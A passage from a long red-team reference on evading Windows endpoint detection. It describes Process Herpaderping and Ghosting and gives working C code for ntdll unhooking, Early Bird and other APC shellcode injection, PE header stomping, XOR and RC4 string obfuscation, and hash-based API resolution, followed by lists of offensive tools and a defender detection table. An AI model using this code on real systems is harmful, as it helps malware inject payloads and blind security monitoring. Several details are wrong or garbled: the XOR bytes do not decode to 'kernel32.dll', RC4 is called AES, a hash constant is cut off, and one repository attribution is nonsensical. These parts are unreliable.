5. The process executes the cached (malicious) image, but the file on disk is now benign

**Evasion mechanism:** When EDR queries the process's image file, it reads the file on disk — which was overwritten with benign content. Memory scanning the process requires reading it from the image cache, which is where the malicious image lives.

**Key difference from Doppelgänging:** No NTFS transactions involved. Just a file overwrite between `NtCreateSection` and `NtCreateProcessEx`.

**Current status:** Detected by EDRs that use `PsSetCreateProcessNotifyRoutineEx` with the full `PS_CREATE_NOTIFY_INFO` structure, which includes the file object — EDRs can read the section's backing file content at process creation time regardless of on-disk state. Defender and CrowdStrike both detect Herpaderping as of 2023.

### Process Ghosting

**Author:** Gabriel Landau (Elastic)
**GitHub:** `https://github.com/gabriellandau/PPLFault` (related — Ghosting concept)
**Blog:** "Process Ghosting: Putting Malware in a Ghost" — Elastic, 2021

**Mechanism:**

Extends Herpaderping's concept but adds a **delete-pending** trick:

1. Create a new file
2. Open the file with `FILE_FLAG_DELETE_ON_CLOSE` or use `NtSetInformationFile` to mark it delete-pending
3. Write the malicious payload to the file
4. Create a section from the delete-pending file
5. The file is now **deleted from the filesystem** (or pending deletion)
6. Create a process from the section

**Evasion mechanism:** The process's image file no longer exists on disk at all by the time EDR tries to scan it. Tools that follow the image path get "file not found." The section backing the process is an anonymous cache entry.

**Key difference from Herpaderping:** The file is *deleted* entirely rather than overwritten. This breaks even EDR approaches that read the backing section at creation time, because the file handle becomes invalid after deletion is committed.

**Current status:** Windows mitigation added: marked delete-pending files cannot be used to create executable image sections on newer Windows builds (Windows 10 21H2+/Windows 11). Elastic's disclosure led directly to the patch. Still relevant in older environments.

### Comparison Table

| Technique | Year | Disk artifact | File state when process runs | Primary evasion |
|---|---|---|---|---|
| Doppelgänging | 2017 | Transaction rolled back to legit file | Original clean file on disk | Section created from transacted (unsaved) write |
| Herpaderping | 2020 | File overwritten with benign content | Benign file on disk | Image cache holds malicious section before overwrite |
| Ghosting | 2021 | No file (deleted or delete-pending) | No file on disk | File doesn't exist when EDR queries |

### Tools

- `https://github.com/hasherezade/process_doppelganging` — hasherezade's Doppelgänging PoC
- `https://github.com/jxy-s/herpaderping` — Herpaderping
- `https://github.com/gabriellandau/PPLFault` — Ghosting-adjacent work by Landau
- `https://github.com/Hagrid29/PEBFuscator` — related process creation evasion

---

## 6. DLL Unhooking

### Why EDR Hooks ntdll (Userland Hooking)

Most EDR products install **inline hooks** into the ntdll.dll copy loaded into each process. The mechanism:

1. When a new process starts, the EDR's kernel driver is notified (via `PsSetLoadImageNotifyRoutine`)
2. The EDR injects its monitoring DLL into the process
3. That DLL overwrites the first 5–14 bytes of sensitive `Nt*` functions in ntdll with a `JMP <EDR_trampoline>`
4. When the process calls `NtAllocateVirtualMemory`, it jumps to the EDR's code, which can:
   - Inspect arguments
   - Query the call stack
   - Block the call
   - Log the event to the EDR sensor
   - Then jump to the original function (trampoline to real syscall)

This is the **userland hooking** model. It's easy for EDRs to implement and gives full function argument visibility, but it runs entirely in userland — meaning the target process can undo it.

### Overwriting ntdll from Disk (Clean Copy)

The simplest approach: read a fresh copy of ntdll.dll directly from disk and overwrite the hooked in-memory copy.

```c
// Overwrite in-memory ntdll .text section with clean copy from disk
BOOL UnhookNtdllFromDisk(void) {
    // Step 1: Get handle to current in-memory ntdll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    // Step 2: Map fresh copy from disk
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL
    );
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID pDiskNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    // Step 3: Get .text section from both copies
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pDiskNtdll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)pDiskNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSection++) {
        if (memcmp(pSection->Name, ".text", 5) == 0) {
            PVOID destAddr = (PBYTE)hNtdll + pSection->VirtualAddress;
            PVOID srcAddr  = (PBYTE)pDiskNtdll + pSection->PointerToRawData;
            SIZE_T size    = pSection->SizeOfRawData;

            DWORD oldProtect;
            VirtualProtect(destAddr, size, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(destAddr, srcAddr, size);
            VirtualProtect(destAddr, size, oldProtect, &oldProtect);
            break;
        }
    }

    UnmapViewOfFile(pDiskNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return TRUE;
}
```

**Detection vectors:**
- The file read of `ntdll.dll` from `C:\Windows\System32\` by a non-system process is suspicious
- `VirtualProtect` of ntdll's `.text` section with `PAGE_EXECUTE_READWRITE` is heavily monitored
- EDRs with kernel-mode integrity checking re-hook from kernel space after userland unhooking

### Overwriting from KnownDlls Section

A more evasive variant avoids touching the filesystem by reading the ntdll `.text` section from the **`\KnownDlls\ntdll.dll`** section object:

```c
// Map ntdll from KnownDlls object directory — no file I/O
UNICODE_STRING usKnownDlls = RTL_CONSTANT_STRING(L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa;
InitializeObjectAttributes(&oa, &usKnownDlls, OBJ_CASE_INSENSITIVE, NULL, NULL);

HANDLE hSection;
NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_QUERY, &oa);

PVOID pKnownNtdll = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &pKnownNtdll, 0, 0, NULL,
                   &viewSize, ViewShare, 0, PAGE_READONLY);

// Now overwrite in-memory ntdll .text from pKnownNtdll (same as disk approach)
```

This avoids the file access patterns that some EDRs monitor and uses the already-mapped KnownDlls section which is loaded at Windows startup and shared across processes.

### Perun's Fart Technique

**Author:** Ceri Coburn (Ethical Chaos)
**Blog:** "Perun's Fart" — EthicalChaos blog

Perun's Fart addresses a limitation of disk-based unhooking: the on-disk ntdll.dll could itself be modified by the EDR (some products do this). It retrieves a clean ntdll from a **suspended process**.

**Mechanism:**
1. Create a suspended process (e.g., `svchost.exe` or `notepad.exe`) using `CREATE_SUSPENDED`
2. This process has ntdll loaded — if it was started fresh, the EDR hasn't had time to hook it (race condition exploitation)
3. Read ntdll's `.text` section from the suspended process's memory via `ReadProcessMemory`
4. Use those bytes to overwrite the current process's ntdll
5. Terminate the suspended process

**Why it works:** Process creation and EDR injection are not atomic. There's a window between process creation and when the EDR's DLL is injected and hooks are installed. A freshly created suspended process may have clean ntdll depending on the EDR's hook installation timing.

### Module Stomping vs Unhooking

These are distinct techniques often confused:

| Technique | Target | What's overwritten | Purpose |
|---|---|---|---|
| **DLL Unhooking** | ntdll/kernelbase hooks | Only the hooked bytes (JMP stubs) or entire `.text` section | Restore original syscall stubs |
| **Module Stomping** | A legitimate DLL's memory | The entire DLL's `.text` section with shellcode/payload | Hide payload inside a legitimate DLL's address range |

**Module stomping** is an injection technique: load a legitimate (but unused) DLL into the process, then overwrite its `.text` section with your shellcode. The shellcode now lives at an address that belongs to `version.dll` or `amsi.dll` — appearing legitimate to call stack checks and memory scanners that whitelist DLL-backed pages.

### Detecting Hooks via PE Header Comparison

To detect whether ntdll is hooked (before deciding whether to unhook):

```c
// Compare in-memory ntdll .text with disk copy to find hooks
BOOL IsNtdllHooked(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    // ... map disk copy ...

    // Compare .text sections byte by byte
    // JMP hooks: E9 XX XX XX XX (5-byte relative JMP)
    // MOV hooks: 48 B8 XX XX XX XX XX XX XX XX FF E0 (12-byte absolute MOV+JMP)

    for (SIZE_T i = 0; i < textSize; i++) {
        if (diskText[i] != memText[i]) {
            printf("[HOOK DETECTED] Offset 0x%zx: disk=0x%02x mem=0x%02x\n",
                   i, diskText[i], memText[i]);
        }
    }
}
```

Detecting which specific functions are hooked lets a red teamer choose between:
- Full unhooking (replace the entire `.text` section)
- Targeted unhooking (only restore the specific hooked bytes)
- Syscall bypass (avoid ntdll entirely for sensitive calls)

**GitHub References:**
- `https://github.com/TheWover/donut` — includes unhooking as part of in-memory loading
- `https://github.com/plackyhacker/Perun-s-Fart` — Perun's Fart implementation
- `https://github.com/EthicalChaos/EarlyBird` — unhooking via early bird
- `https://github.com/Mr-Un1k0d3r/EDRs` — EDR hook detection tool
- `https://github.com/slaeryan/AQUARMOURY` — Anthropic collection includes unhooking

---

## 7. APC Injection

### NtQueueApcThread Basics

**Asynchronous Procedure Calls (APCs)** are a Windows kernel mechanism allowing a function to be queued for execution in the context of a specific thread. There are two APC queues per thread:
- **Kernel APC queue** — serviced by the kernel, used for I/O completion etc.
- **User APC queue** — serviced when the thread enters an "alertable" wait state

`NtQueueApcThread` enqueues a user APC to a target thread. When that thread enters an alertable wait (`WaitForSingleObjectEx` with `bAlertable=TRUE`, `SleepEx`, `MsgWaitForMultipleObjectsEx`, etc.), the APC is dispatched.

```c
// Basic APC injection pattern
BOOL InjectViaApc(HANDLE hProcess, HANDLE hThread, PVOID shellcodeAddr) {
    // shellcodeAddr must point to executable memory in hProcess
    // ApcRoutine will be called with (NormalContext, SystemArgument1, SystemArgument2)
    // For shellcode, ApcRoutine = shellcodeAddr, other args = 0

    NTSTATUS status = NtQueueApcThread(
        hThread,                    // Target thread
        (PKNORMAL_ROUTINE)shellcodeAddr,  // APC routine (our shellcode)
        shellcodeAddr,              // NormalContext (passed as arg)
        NULL,                       // SystemArgument1
        NULL                        // SystemArgument2
    );
    return NT_SUCCESS(status);
}
```

**Limitation:** The thread must enter an alertable wait state for the APC to fire. Random threads in a process may never enter alertable states. This led to the Early Bird technique.

### Early Bird APC Injection

**Concept:** Create a new process (or thread) in **suspended state**, queue APC(s) before the main thread runs, then resume. The thread enters an alertable state as part of its initialization (`LdrInitializeThunk` calls alertable waits internally), so the APC fires before any user code runs.

```c
// Early Bird APC injection — full flow
BOOL EarlyBirdInject(LPCSTR targetExe, PBYTE shellcode, SIZE_T shellcodeSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // Create target process suspended
    if (!CreateProcessA(targetExe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;

    // Allocate RX memory in target process
    PVOID remoteAddr = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write shellcode
    WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, shellcodeSize, NULL);

    // Queue APC to the main thread (still suspended)
    QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, 0);

    // Resume thread — shellcode fires during LdrInitializeThunk alertable wait
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
```

**Why Early Bird avoids some EDR hooks:** At the time of `QueueUserAPC`, the process is still suspended and the EDR's monitoring DLL hasn't been injected yet. The shellcode runs before EDR hooks are in place.

**Caveats:** Process creation itself is visible to EDR kernel callbacks. Some EDRs scan newly created processes for APC queue entries before resuming.

### APC to Alertable Threads

For injection into existing processes (not creating new ones), the challenge is finding threads in an alertable wait state. Strategies:

1. **Scan all threads** in the target process: iterate via `CreateToolhelp32Snapshot` + `Thread32First/Next`, call `SuspendThread`, inspect `CONTEXT.Dr6/EFLAGS` for wait state indicators, resume if not alertable
2. **Target known-alertable threads:** Windows processes like `explorer.exe`, `svchost.exe`, and media-related processes regularly have threads in alertable waits for UI events
3. **Force alertable state:** Create a remote thread that immediately calls `SleepEx(INFINITE, TRUE)` — it will then be alertable for your APC

```c
// Queue APC to all threads (shotgun approach — at least one should be alertable)
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, targetPid);
THREADENTRY32 te = { sizeof(te) };

if (Thread32First(hSnapshot, &te)) {
    do {
        if (te.th32OwnerProcessID == targetPid) {
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (hThread) {
                QueueUserAPC((PAPCFUNC)remoteShellcodeAddr, hThread, 0);
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnapshot, &te));
}
CloseHandle(hSnapshot);
```

### NtQueueApcThreadEx

`NtQueueApcThreadEx` (undocumented, Windows 8+) adds a `ReserveHandle` parameter that allows specifying a **special user APC** mode. With `QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC` (value 1), the APC fires **even in non-alertable waits** — effectively forcing APC delivery without needing the thread to be in an alertable state.

```c
// NtQueueApcThreadEx with special user APC — fires regardless of alertable state
typedef NTSTATUS (NTAPI* pNtQueueApcThreadEx)(
    HANDLE  ThreadHandle,
    HANDLE  ReserveHandle,    // NULL for special APC
    PKNORMAL_ROUTINE ApcRoutine,
    PVOID   NormalContext,
    PVOID   SystemArgument1,
    PVOID   SystemArgument2
);

// Call with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
// ReserveHandle = (HANDLE)1 in some implementations
NTSTATUS status = NtQueueApcThreadEx(
    hThread,
    (HANDLE)QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
    (PKNORMAL_ROUTINE)remoteAddr,
    remoteAddr, NULL, NULL
);
```

**Note:** Special user APCs may bypass some EDR checks that rely on alertable-state detection. This was documented by Akamai Security Research in 2022.

### Ghost Writing via APC

**Author:** Ired.team / various
**GitHub:** `https://github.com/gabriellandau/GhostWriting`

Ghost Writing avoids `WriteProcessMemory` (which is heavily monitored) by using APC injection to make the **target process write to its own memory**.

1. Allocate RX memory in target (using `NtMapViewOfSection` of an already-existing section rather than `VirtualAllocEx`)
2. Queue APCs that execute simple `MOV [addr], val` write gadgets inside the target process — writing your shellcode byte by byte
3. Queue a final APC to execute the shellcode

This means the memory writes appear as self-writes from the target process rather than cross-process writes, bypassing EDR monitors on `WriteProcessMemory`.

### Detection Indicators

| Indicator | Detection Method | Severity |
|---|---|---|
| `QueueUserAPC` to suspended thread | ETW `Microsoft-Windows-Kernel-Process` events | High |
| Remote thread creation + APC | Combination of `NtCreateThreadEx` + `NtQueueApcThread` sequence | High |
| Cross-process `WriteProcessMemory` followed by APC queue | Sequence correlation | High |
| Special user APC (non-alertable delivery) | `NtQueueApcThreadEx` with flag=1 in ETW | Medium |
| APC to `LdrInitializeThunk` early in process lifetime | Kernel callback timing analysis | High |
| Shellcode at APC routine address (no backing image) | Memory scan of APC target address | High |

**GitHub References:**
- `https://github.com/gabriellandau/GhostWriting` — Ghost Writing
- `https://github.com/thefLink/Hunt-Sleeping-Beacons` — detection tool (defender perspective)
- `https://github.com/3xpl01tc0d3r/ProcessInjection` — APC injection PoC collection
- Research: "A Deep Dive into APC Injection Variants" — Akamai Security, 2022

---

## 8. PE Header Stomping & Payload Obfuscation

### Erasing/Zeroing PE Headers Post-Injection

When a PE (DLL or EXE) is loaded reflectively (injected into memory without the Windows loader), the DOS header and NT headers at the base of the image are not strictly needed at runtime — they were only needed during loading. Zeroing them out post-load prevents memory scanners from:

1. Identifying the image as a PE file (no `MZ` magic / `PE\0\0` signature)
2. Walking the PE sections and imports to identify the payload
3. Matching signatures that target PE header offsets

```c
// Zero out PE headers after reflective loading
VOID StompPEHeaders(PVOID imageBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + pDos->e_lfanew);

    // Calculate size of headers (includes DOS header, stub, NT header, section headers)
    DWORD headerSize = pNt->OptionalHeader.SizeOfHeaders;

    // Make headers writable
    DWORD oldProtect;
    VirtualProtect(imageBase, headerSize, PAGE_READWRITE, &oldProtect);

    // Zero all header bytes
    RtlZeroMemory(imageBase, headerSize);

    // Optionally restore protection (or leave as RW — less suspicious than RWX)
    VirtualProtect(imageBase, headerSize, oldProtect, &oldProtect);
}
```

**Selective stomping:** Some implementations only zero the `MZ` signature (first 2 bytes) and the `PE\0\0` signature, minimizing writes while still defeating signature-based PE detection.

**Limitations:** EDRs with kernel-mode memory scanning can track memory region allocation and typing even without PE headers. Page-level metadata (allocation size, protection flags) remains visible.

### String Obfuscation — XOR

XOR is the most common string obfuscation. Compile-time XOR using C++ templates or macros ensures strings never appear in plaintext in the binary:

```c
// XOR string obfuscation — compile-time encryption
// Key: 0x42 (or a random per-string key)
#define XOR_KEY 0x42

// Decrypt at runtime
void XorDecrypt(char* buf, size_t len, BYTE key) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= key;
}

// Obfuscated string storage (pre-XORed values hardcoded)
// "kernel32.dll" XOR'd with 0x42:
BYTE encKernel32[] = {
    0x29, 0x27, 0x36, 0x2e, 0x27, 0x6c, 0x12, 0x12,
    0x2e, 0x6c, 0x26, 0x6c, 0x6c, 0x00
};

// Runtime usage:
char kernel32[15];
memcpy(kernel32, encKernel32, sizeof(encKernel32));
XorDecrypt(kernel32, sizeof(encKernel32) - 1, XOR_KEY);
// kernel32 now = "kernel32.dll"
HMODULE hK32 = LoadLibraryA(kernel32);
```

**More sophisticated:** Use a different random key per string (stored alongside), or derive the key from a stable runtime value (PID, timestamp, process name) so the key doesn't appear as a constant in the binary.

### String Obfuscation — RC4/AES

For stronger obfuscation (defeating entropy analysis and brute-force XOR attacks):

```c
// AES-256 string decryption using SystemFunction033 (undocumented advapi32 export)
// This avoids linking against a crypto library and keeps the binary clean

typedef NTSTATUS (NTAPI* pSystemFunction033)(
    PUCHAR InBuffer,
    ULONG  InBufferLen,
    PUCHAR Key,
    PULONG KeyLen
);

VOID AesDecryptString(PBYTE encData, ULONG encLen,
                      PBYTE key, ULONG keyLen, PBYTE output) {
    pSystemFunction033 pfnSF033 = (pSystemFunction033)
        GetProcAddress(GetModuleHandleA("advapi32.dll"), "SystemFunction033");

    memcpy(output, encData, encLen);
    pfnSF033(output, encLen, key, &keyLen);
}
```

Modern implants (Brute Ratel C4, Havoc C2, newer Cobalt Strike profiles) encrypt all their strings using AES-CBC or ChaCha20 with keys derived at load time or stored encrypted with a secondary key.

### Import Hashing for API Resolution

Instead of storing import strings (e.g., `"VirtualAllocEx"`, `"NtCreateThreadEx"`), hashing resolves APIs at runtime by walking the export table and comparing hashes:

```c
// Common djb2-style hash for API resolution
DWORD HashApiName(const char* name) {
    DWORD hash = 5381;
    while (*name) {
        hash = ((hash << 5) + hash) + (BYTE)*name++;
    }
    return hash;
}

// Pre-computed hashes (no strings in binary)
#define HASH_VIRTUALALLOC     0x97bc257  // "VirtualAllocEx"
#define HASH_CREATEREMOTETHREAD 0xe573...  // "NtCreateThreadEx"

// Resolve at runtime by walking export table
FARPROC ResolveApi(HMODULE hModule, DWORD targetHash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)hModule +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    PDWORD pNames    = (PDWORD)((PBYTE)hModule + pExp->AddressOfNames);
    PWORD  pOrdinals = (PWORD) ((PBYTE)hModule + pExp->AddressOfNameOrdinals);
    PDWORD pFuncs    = (PDWORD)((PBYTE)hModule + pExp->AddressOfFunctions);

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char* name = (const char*)((PBYTE)hModule + pNames[i]);
        if (HashApiName(name) == targetHash) {
            return (FARPROC)((PBYTE)hModule + pFuncs[pOrdinals[i]]);
        }
    }
    return NULL;
}
```

**Limitations:** Hash collisions (rare but possible). EDRs can still monitor API call telemetry via ETW/hooks regardless of how you resolved the API address. Some tools use case-insensitive hashing; others rotate hash algorithms per build to avoid static hash-value signatures.

### Reflective DLL Loading Without PE Headers

**Concept (Stephen Fewer, 2008, still foundational):**
A reflective loader is a piece of code embedded in a DLL that can load itself into memory by:
1. Finding its own base address (via `GetPC` trick — `CALL $+5; POP RAX`)
2. Parsing its own headers to find sections, imports, relocations
3. Applying base relocations (rebasing)
4. Resolving imports (walking the PEB LDR list)
5. Calling `DllMain`

**GitHub:** `https://github.com/stephenfewer/ReflectiveDLLInjection` — original
**GitHub:** `https://github.com/monoxgas/sRDI` — shellcode RDI (more evasive variant)

**Without PE headers — the evolution:**

The original reflective loader parses PE headers at load time. After loading, a "header stomp" removes the headers. More advanced implementations (sRDI, donut) have the loader parse headers before loading and then intentionally never map headers into memory at all — the loaded image in memory has no DOS/NT header region.

```c
// Conceptual: load DLL sections without mapping PE headers
// The loader reads section data directly, calculates VAs manually,
// and writes sections at computed offsets — never using VirtualAlloc
// for the header region at all.

// This means: no MZ/PE signatures at imageBase
// Memory layout looks like anonymous RX data starting directly with .text

PVOID LoadWithoutHeaders(PBYTE rawDll, SIZE_T rawSize) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)rawDll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(rawDll + pDos->e_lfanew);

    // Allocate only for sections, not for header region
    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage
                     - pNt->OptionalHeader.SizeOfHeaders;
    PVOID base = VirtualAlloc(
        (LPVOID)pNt->OptionalHeader.ImageBase,
        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );

    // Copy sections directly to their VA offsets relative to base
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, sec++) {
        PVOID dest = (PBYTE)base +
                     (sec->VirtualAddress - pNt->OptionalHeader.SizeOfHeaders);
        memcpy(dest, rawDll + sec->PointerToRawData, sec->SizeOfRawData);
    }

    // Apply relocations + resolve imports against the adjusted base
    // ...
    return base;
}
```

**Tools:**
- `https://github.com/stephenfewer/ReflectiveDLLInjection` — original reflective loader
- `https://github.com/monoxgas/sRDI` — shellcode reflective DLL injection (no PE headers in memory)
- `https://github.com/TheWover/donut` — in-memory loader with PE header stomping
- `https://github.com/Cracked5pider/KaynLdr` — modern reflective loader (2022)
- `https://github.com/EddieIvan01/mem-loader` — PE-header-free loader PoC

---

## Quick Reference: Key Tools & GitHub Links

| Tool | Technique | Repository |
|---|---|---|
| SysWhispers3 | Indirect syscalls | `github.com/klezVirus/SysWhispers3` |
| Hell's Gate | Dynamic SSN resolution | `github.com/am0nsec/HellsGate` |
| Tartarus Gate | Hooked ntdll SSN resolution | `github.com/trickster0/TartarusGate` |
| RecycledGate | Reuse ntdll syscall stubs | `github.com/thefLink/RecycleGate` |
| FreshyCalls | EAT-sort SSN resolution | `github.com/crummie5/FreshyCalls` |
| Ekko | Sleep obfuscation (timer) | `github.com/Cracked5pider/Ekko` |
| Foliage | Sleep obfuscation (APC chain) | `github.com/SecIdiot/FOLIAGE` |
| Cronos | Sleep obfuscation (waitable timer) | `github.com/Idov31/Cronos` |
| ShellcodeFluctuation | Sleep + page perm obfuscation | `github.com/mgeeky/ShellcodeFluctuation` |
| ThreadStackSpoofer | Call stack spoofing | `github.com/mgeeky/ThreadStackSpoofer` |
| SilentMoonwalk | Shadow stack spoofing | `github.com/klezVirus/SilentMoonwalk` |
| CallStackMasker | Call stack masking | `github.com/WithSecureLabs/CallStackMasker` |
| Process Herpaderping | Process image mismatch | `github.com/jxy-s/herpaderping` |
| Process Doppelganging | NTFS transaction process | `github.com/hasherezade/process_doppelganging` |
| Perun's Fart | Unhook via suspended process | `github.com/plackyhacker/Perun-s-Fart` |
| Ghost Writing | APC-based self-write | `github.com/gabriellandau/GhostWriting` |
| sRDI | Shellcode reflective DLL | `github.com/monoxgas/sRDI` |
| donut | In-memory .NET/PE loader | `github.com/TheWover/donut` |
| KaynLdr | Modern reflective loader | `github.com/Cracked5pider/KaynLdr` |

---

## Detection Summary for Defenders

| Technique | Primary Detection Signal | Best Defense Layer |
|---|---|---|
| ETW patching | ntdll page modification; absence of expected events | Kernel integrity monitoring |
| Sleep obfuscation | Memory region encrypt/decrypt cycle; permission changes during sleep | Memory scanning during transitions |
| Stack spoofing | Fake frames with no valid module backing; missing thread frames | Return address validation (CFG, CET) |
| Indirect syscalls | Syscall from ntdll but with unusual preceding call chain | Kernel Last Branch Record analysis |
| Process Ghosting/Herpaderping | Image file mismatch at process creation | Kernel process creation callbacks |
| DLL unhooking | ntdll .text modification; file read of system DLLs | Re-hook from kernel; page integrity |
| APC injection | NtQueueApcThread to non-alertable threads; Early Bird timing | Process creation APC queue inspection |
| PE header stomp | No MZ signature at image base; anonymous RX regions | Kernel memory tagging; section tracking |
